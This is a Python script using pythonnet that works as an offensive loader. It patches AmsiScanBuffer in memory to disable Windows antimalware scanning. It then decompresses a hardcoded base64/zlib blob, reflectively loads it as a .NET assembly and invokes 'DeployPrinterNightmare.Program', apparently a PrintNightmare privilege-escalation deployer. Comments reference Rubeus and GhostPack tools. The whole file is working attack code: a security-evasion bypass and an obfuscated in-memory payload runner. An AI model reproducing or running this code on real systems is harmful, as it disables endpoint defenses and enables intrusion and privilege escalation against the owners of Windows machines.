import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("DeployPrinterNightmare.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()